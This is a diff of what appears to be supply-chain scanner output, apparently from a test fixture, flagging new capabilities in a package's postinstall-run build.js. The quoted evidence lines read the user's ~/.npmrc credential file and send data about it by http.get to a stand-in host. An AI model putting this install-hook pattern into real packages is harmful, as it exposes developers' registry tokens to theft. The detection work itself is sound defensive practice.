@@ -1,3 +1,9 @@
+capability_added CAPABILITY_FS_SENSITIVE_READ EXEC_CONTEXT_INSTALL confidence=0.70
+  evidence: lib/build.js:13 length = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8').length;
+  attrs: detail=npm: .npmrc package_had_capability=false reached_from=scripts.postinstall uses_in_file=1
+capability_added CAPABILITY_NETWORK EXEC_CONTEXT_INSTALL confidence=0.50
+  evidence: lib/build.js:18 http.get({ host: 'sinkhole.invalid', path: '/drift-fixture?npmrc_length=' + length }).on('error', () => {});
+  attrs: detail=http.get package_had_capability=false reached_from=scripts.postinstall uses_in_file=2
 file_added CAPABILITY_UNSPECIFIED EXEC_CONTEXT_INSTALL confidence=0.80
   evidence: lib/build.js:0 
   attrs: run_by_install_hook=true sha256=6472690710e8798140dc53bac5ce074bde35dec4b235a6015f31b7876d957da1 size=653
